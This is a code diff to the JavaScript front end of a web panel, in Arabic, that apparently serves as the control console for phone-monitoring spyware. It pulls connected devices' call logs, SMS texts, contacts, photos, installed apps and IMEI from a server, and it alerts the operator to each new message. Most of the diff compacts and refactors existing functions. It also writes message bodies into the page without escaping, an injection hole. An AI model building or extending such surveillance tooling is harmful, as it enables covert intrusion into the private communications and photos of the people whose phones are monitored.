@@ -17,18 +17,8 @@ let lastSmsCount = 0;
 let notificationShown = false;
 let soundPlayedForDevice = false;
 
-function logout() {
-    sessionStorage.removeItem('logged_in');
-    window.location.href = 'login.html';
-}
-
-function playNotificationSound() {
-    try {
-        const audio = new Audio('v.wav');
-        audio.volume = 1.0;
-        audio.play();
-    } catch (e) {}
-}
+function logout() { sessionStorage.removeItem('logged_in'); window.location.href = 'login.html'; }
+function playNotificationSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
 
 function findContactName(number) {
     if (!allContacts || allContacts.length === 0 || !number) return null;
@@ -37,35 +27,26 @@ function findContactName(number) {
         const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
         for (let n of numbers) {
             if (!n) continue;
-            const cleanN = n.replace(/[^0-9]/g, '').slice(-9);
-            if (cleanN === cleanNumber) return contact.name;
+            if (n.replace(/[^0-9]/g, '').slice(-9) === cleanNumber) return contact.name;
         }
     }
     return null;
 }
 
 function showNotification(title, message, icon) {
-    const notificationDiv = document.createElement('div');
-    notificationDiv.className = 'notification-popup';
-    notificationDiv.innerHTML = `
-        <div class="notification-icon">${icon}</div>
-        <div class="notification-content">
-            <div class="notification-title">${title}</div>
-            <div class="notification-message">${message}</div>
-        </div>
-        <button class="notification-close" onclick="this.parentElement.remove()">✕</button>
-    `;
-    document.body.appendChild(notificationDiv);
+    const div = document.createElement('div');
+    div.className = 'notification-popup';
+    div.innerHTML = `<div class="notification-icon">${icon}</div><div class="notification-content"><div class="notification-title">${title}</div><div class="notification-message">${message}</div></div><button class="notification-close" onclick="this.parentElement.remove()">✕</button>`;
+    document.body.appendChild(div);
     playNotificationSound();
-    setTimeout(() => { if (notificationDiv.parentElement) notificationDiv.remove(); }, 5000);
+    setTimeout(() => { if (div.parentElement) div.remove(); }, 5000);
 }
 
 function checkNewCalls(newCalls) {
     if (!newCalls || newCalls.length === 0) return;
     if (lastCallCount > 0 && newCalls.length > lastCallCount) {
-        const newCall = newCalls[0];
-        const displayName = findContactName(newCall.number) || newCall.number || 'غير معروف';
-        showNotification('📞 مكالمة جديدة', `${displayName} — ${getCallType(newCall.type)}`, '📞');
+        const c = newCalls[0];
+        showNotification('📞 مكالمة جديدة', `${findContactName(c.number) || c.number} — ${getCallType(c.type)}`, '📞');
     }
     lastCallCount = newCalls.length;
 }
@@ -73,60 +54,50 @@ function checkNewCalls(newCalls) {
 function checkNewSMS(newSMS) {
     if (!newSMS || newSMS.length === 0) return;
     if (lastSmsCount > 0 && newSMS.length > lastSmsCount) {
-        const newSMSItem = newSMS[0];
-        const displayName = findContactName(newSMSItem.address) || newSMSItem.address || 'غير معروف';
-        showNotification('💬 رسالة جديدة', `${displayName}: ${newSMSItem.body || ''}`, '💬');
+        const s = newSMS[0];
+        showNotification('💬 رسالة جديدة', `${findContactName(s.address) || s.address}: ${s.body || ''}`, '💬');
     }
     lastSmsCount = newSMS.length;
-}
-
-function checkDeviceReconnect(data) {
-    if (data.online && wasOffline && !notificationShown) {
-        notificationShown = true;
-        showNotification('✅ الجهاز متصل', 'عاد الجهاز للاتصال', '🔌');
-        setTimeout(() => { notificationShown = false; }, 30000);
-    }
-    wasOffline = data.online;
-}
-
-async function deleteDevice() {
-    if (!currentDevice) return;
-    if (!confirm('حذف هذا الجهاز؟')) return;
-    try {
-        await fetch(`/api.php?action=delete_device&device=${currentDevice}`);
-        loadDevices();
-        currentDevice = null;
-        document.getElementById('deviceSelect').value = '';
-    } catch (e) {}
 }
 
 async function loadDevices() {
     try {
         const response = await fetch('/devices.json');
         const devices = await response.json();
+        
         const select = document.getElementById('deviceSelect');
         const currentValue = currentDevice;
         select.innerHTML = '<option value="">اختر الجهاز...</option>';
+        
         devices.forEach(device => {
             const option = document.createElement('option');
             option.value = device.id;
-            option.textContent = device.id;
+            option.textContent = device.name || device.id;
             select.appendChild(option);
         });
-        if (currentValue) select.value = currentValue;
+        
+        if (currentValue) {
+            select.value = currentValue;
+        } else if (devices.length > 0) {
+            selectDevice(devices[0].id);
+            select.value = devices[0].id;
+        }
     } catch (e) {}
 }
 
 function selectDevice(deviceId) {
     currentDevice = deviceId;
     
-    const deviceNameDisplay = document.getElementById('deviceNameDisplay');
+    const display = document.getElementById('deviceNameDisplay');
     if (deviceId) {
-        deviceNameDisplay.textContent = `📱 ${deviceId}`;
-        deviceNameDisplay.className = 'device-name-display active';
+        const select = document.getElementById('deviceSelect');
+        const selectedOption = select.options[select.selectedIndex];
+        const deviceName = selectedOption ? selectedOption.textContent : deviceId;
+        display.textContent = `📱 ${deviceName}`;
+        display.className = 'device-name-display active';
     } else {
-        deviceNameDisplay.textContent = 'لا يوجد جهاز محدد';
-        deviceNameDisplay.className = 'device-name-display';
+        display.textContent = 'لا يوجد جهاز';
+        display.className = 'device-name-display';
     }
     
     if (deviceId && !soundPlayedForDevice) {
@@ -151,7 +122,6 @@ async function updateLiveData() {
     try {
         const response = await fetch(`/live.php?device=${currentDevice}`);
         const data = await response.json();
-        checkDeviceReconnect(data);
         
         const statusEl = document.getElementById('networkStatus');
         if (data.online) { statusEl.textContent = data.network || 'متصل'; statusEl.className = 'value online'; }
@@ -192,30 +162,18 @@ async function loadCalls() {
 function displayCallsList() {
     document.getElementById('callDetailView').style.display = 'none';
     document.getElementById('callsListView').style.display = 'block';
-    const listDiv = document.getElementById('callsListView');
-    listDiv.innerHTML = '';
-    if (!allCalls || allCalls.length === 0) { listDiv.innerHTML = '<p style="color:#888;">لا توجد مكالمات</p>'; return; }
+    const div = document.getElementById('callsListView');
+    div.innerHTML = '';
+    if (!allCalls || allCalls.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد مكالمات</p>'; return; }
     
-    const sortedCalls = [...allCalls].sort((a, b) => (b.date || 0) - (a.date || 0));
-    sortedCalls.forEach(call => {
+    [...allCalls].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
         const displayName = call.name || findContactName(call.number) || call.number || 'غير معروف';
-        const div = document.createElement('div');
-        div.className = 'conversation-item';
-        div.onclick = () => openCallDetail(call.number);
-        div.innerHTML = `
-            <div class="conversation-avatar">${getCallIcon(call.type)}</div>
-            <div class="conversation-info">
-                <div class="conversation-name">${displayName}</div>
-                <div class="conversation-preview">${formatDate(call.date)}</div>
-            </div>
-            <div class="conversation-time">${formatDuration(call.duration)}</div>
-        `;
-        listDiv.appendChild(div);
+        const item = document.createElement('div');
+        item.className = 'conversation-item';
+        item.onclick = () => openCallDetail(call.number);
+        item.innerHTML = `<div class="conversation-avatar">${call.type == 1 ? '📥' : call.type == 2 ? '📤' : '❌'}</div><div class="conversation-info"><div class="conversation-name">${displayName}</div><div class="conversation-preview">${formatDate(call.date)}</div></div><div class="conversation-time">${formatDuration(call.duration)}</div>`;
+        div.appendChild(item);
     });
-}
-
-function getCallIcon(type) {
-    switch(parseInt(type)) { case 1: return '📥'; case 2: return '📤'; case 3: return '❌'; default: return '📞'; }
 }
 
 function openCallDetail(number) {
@@ -225,7 +183,7 @@ function openCallDetail(number) {
     document.getElementById('callDetailTitle').textContent = `📞 ${findContactName(number) || number}`;
     const detailsDiv = document.getElementById('callDetailsList');
     detailsDiv.innerHTML = '';
-    allCalls.filter(call => call.number === number).sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
+    allCalls.filter(c => c.number === number).sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
         const div = document.createElement('div');
         div.className = 'call-detail-item';
         div.innerHTML = `<span class="call-type type-${call.type}">${getCallType(call.type)}</span><span>⏱️ ${formatDuration(call.duration)}</span><span>📅 ${formatDate(call.date)}</span>`;
@@ -277,7 +235,7 @@ function openChat(number) {
     document.getElementById('chatTitle').textContent = `💬 ${findContactName(number) || number}`;
     const messagesList = document.getElementById('messagesList');
     messagesList.innerHTML = '';
-    allSMS.filter(sms => sms.address === number).sort((a, b) => (a.date || 0) - (b.date || 0)).forEach(sms => {
+    allSMS.filter(s => s.address === number).sort((a, b) => (a.date || 0) - (b.date || 0)).forEach(sms => {
         const div = document.createElement('div');
         div.className = `message ${sms.type == 1 ? 'incoming' : 'outgoing'}`;
         div.innerHTML = `<div class="message-bubble"><div class="message-text">${sms.body || ''}</div><div class="message-time">${formatDate(sms.date)}</div></div>`;
@@ -312,7 +270,7 @@ function displayContactsList() {
         const item = document.createElement('div');
         item.className = 'conversation-item';
         item.onclick = () => openContactDetail(contact.name);
-        item.innerHTML = `<div class="conversation-avatar">👤</div><div class="conversation-info"><div class="conversation-name">${contact.name || 'بدون اسم'}</div><div class="conversation-preview">${numbers.join(', ')}</div></div><button class="action-btn" onclick="event.stopPropagation(); openChat('${numbers[0]}')">💬</button>`;
+        item.innerHTML = `<div class="conversation-avatar">👤</div><div class="conversation-info"><div class="conversation-name">${contact.name || 'بدون اسم'}</div><div class="conversation-preview">${numbers.join(', ')}</div></div>`;
         div.appendChild(item);
     });
 }
@@ -324,14 +282,7 @@ function openContactDetail(name) {
     const contact = allContacts.find(c => c.name === name);
     if (!contact) return;
     const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
-    document.getElementById('contactDetails').innerHTML = `
-        <div class="contact-detail-card">
-            <div class="contact-avatar">👤</div>
-            <h4>${contact.name || 'بدون اسم'}</h4>
-            <div class="contact-numbers">
-                ${numbers.map(n => `<div class="contact-number-item"><span>${n}</span><div><button class="action-btn" onclick="openChat('${n}')">💬</button><button class="action-btn" onclick="openCallDetail('${n}')">📞</button></div></div>`).join('')}
-            </div>
-        </div>`;
+    document.getElementById('contactDetails').innerHTML = `<div class="contact-detail-card"><div class="contact-avatar">👤</div><h4>${contact.name}</h4><div class="contact-numbers">${numbers.map(n => `<div class="contact-number-item"><span>${n}</span><div><button class="action-btn" onclick="openChat('${n}')">💬</button><button class="action-btn" onclick="openCallDetail('${n}')">📞</button></div></div>`).join('')}</div></div>`;
 }
 
 function backToContactsList() { currentContact = null; displayContactsList(); }
@@ -344,30 +295,17 @@ async function loadImages() {
         grid.innerHTML = '';
         if (!images || images.length === 0) { grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>'; return; }
         
-        [...images].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach((image, index) => {
+        [...images].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach((image, i) => {
             const div = document.createElement('div');
             div.className = 'image-card';
             const img = document.createElement('img');
-            if (image.data) {
-                let mime = 'image/jpeg';
-                if (image.name) { const ext = image.name.toLowerCase().split('.').pop(); if (ext === 'png') mime = 'image/png'; else if (ext === 'webp') mime = 'image/webp'; }
-                img.src = `data:${mime};base64,${image.data}`;
-            }
+            if (image.data) { let m = 'image/jpeg'; if (image.name) { const e = image.name.toLowerCase().split('.').pop(); if (e === 'png') m = 'image/png'; } img.src = `data:${m};base64,${image.data}`; }
             img.className = 'thumb';
-            const name = document.createElement('div');
-            name.className = 'image-name';
-            name.textContent = image.name || `صورة ${index + 1}`;
-            const btns = document.createElement('div');
-            btns.className = 'image-buttons';
-            const viewBtn = document.createElement('button');
-            viewBtn.className = 'view-btn';
-            viewBtn.textContent = '👁️ عرض';
-            viewBtn.onclick = () => window.open(img.src, '_blank');
-            const dlBtn = document.createElement('button');
-            dlBtn.className = 'download-btn';
-            dlBtn.textContent = '⬇️ تحميل';
-            dlBtn.onclick = () => { const a = document.createElement('a'); a.href = img.src; a.download = image.name || `img_${index}.jpg`; document.body.appendChild(a); a.click(); document.body.removeChild(a); };
-            btns.appendChild(viewBtn); btns.appendChild(dlBtn);
+            const name = document.createElement('div'); name.className = 'image-name'; name.textContent = image.name || `صورة ${i+1}`;
+            const btns = document.createElement('div'); btns.className = 'image-buttons';
+            const v = document.createElement('button'); v.className = 'view-btn'; v.textContent = '👁️'; v.onclick = () => window.open(img.src);
+            const d = document.createElement('button'); d.className = 'download-btn'; d.textContent = '⬇️'; d.onclick = () => { const a = document.createElement('a'); a.href = img.src; a.download = image.name; document.body.appendChild(a); a.click(); a.remove(); };
+            btns.appendChild(v); btns.appendChild(d);
             div.appendChild(img); div.appendChild(name); div.appendChild(btns);
             grid.appendChild(div);
         });
@@ -380,8 +318,8 @@ async function loadApps() {
         const apps = await response.json();
         const tbody = document.querySelector('#appsTable tbody');
         tbody.innerHTML = '';
-        if (!apps || apps.length === 0) { tbody.innerHTML = '<tr><td colspan="3">لا توجد تطبيقات</td></tr>'; return; }
-        apps.forEach(app => { const row = document.createElement('tr'); row.innerHTML = `<td>${app.name || app.package}</td><td>${app.package}</td><td>${app.system_app ? 'نعم' : 'لا'}</td>`; tbody.appendChild(row); });
+        if (!apps || apps.length === 0) return;
+        apps.forEach(app => { const r = document.createElement('tr'); r.innerHTML = `<td>${app.name || app.package}</td><td>${app.package}</td><td>${app.system_app ? 'نعم' : 'لا'}</td>`; tbody.appendChild(r); });
     } catch (e) {}
 }
 
@@ -390,14 +328,8 @@ async function loadDeviceInfo() {
         const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=device_info`);
         const info = await response.json();
         const div = document.getElementById('deviceInfo');
-        if (!info || Object.keys(info).length === 0) { div.innerHTML = '<p>لا توجد معلومات</p>'; return; }
-        div.innerHTML = `<div class="device-info-grid">
-            <div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div>
-            <div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div>
-            <div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div>
-            <div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div>
-            <div class="info-card"><span>الناقل:</span><strong>${info.carrier || '—'}</strong></div>
-        </div>`;
+        if (!info || Object.keys(info).length === 0) return;
+        div.innerHTML = `<div class="device-info-grid"><div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div><div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div><div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div><div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div></div>`;
     } catch (e) {}
 }
 
